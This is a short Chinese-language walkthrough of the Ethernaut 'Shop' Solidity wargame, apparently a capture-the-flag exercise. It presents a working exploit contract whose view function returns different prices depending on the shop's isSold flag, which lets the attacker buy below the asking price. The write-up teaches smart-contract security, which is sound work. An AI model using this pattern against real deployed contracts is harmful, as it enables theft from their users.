# 0x01 Task

**这篇是在solidity0.5版本下的wargame，0.4版本页面返回404**

```javascript
pragma solidity ^0.5.0;

interface Buyer {
  function price() external view returns (uint);
}

contract Shop {
  uint public price = 100;
  bool public isSold;

  function buy() public {
    Buyer _buyer = Buyer(msg.sender);

    if (_buyer.price.gas(3000)() >= price && !isSold) {
      isSold = true;
      price = _buyer.price.gas(3000)();
    }
  }
}
```

Сan you get the item from the shop for less than the price asked?

## 0x02 need2know

修饰符`view`

> ##### View 函数
>
> 可以将函数声明为 `view` 类型，这种情况下要保证不修改状态。
>
> 下面的语句被认为是修改状态：
>
> 1. 修改状态变量。
> 2. [产生事件](file:///C:/Users/xzy/Desktop/Work/solidity-中文文档/index.html#events)。
> 3. 创建其它合约
> 4. 使用 `selfdestruct`。
> 5. 通过调用发送以太币。
> 6. 调用任何没有标记为 `view` 或者 `pure` 的函数。
> 7. 使用低级调用。
> 8. 使用包含特定操作码的内联汇编。

## 0x03 Solution

exp:

```javascript
pragma solidity ^0.5.0;

contract Shop {
  uint public price = 100;
  bool public isSold;

  function buy() public {
    Buyer _buyer = Buyer(msg.sender);

    if (_buyer.price.gas(3000)() >= price && !isSold) {
      isSold = true;
      price = _buyer.price.gas(3000)();
    }
  }
}

contract Buyer{
    
    Shop target;
    
    function attack(address _addr) public{
        target = Shop(_addr);
        target.buy();
    }
    
    function price() external view returns (uint){
        if (Shop(msg.sender).isSold() == true){
            return 99;
        }
        return 101;
    }
}
```

使用`isSold`作为判断条件，返回不同的价格。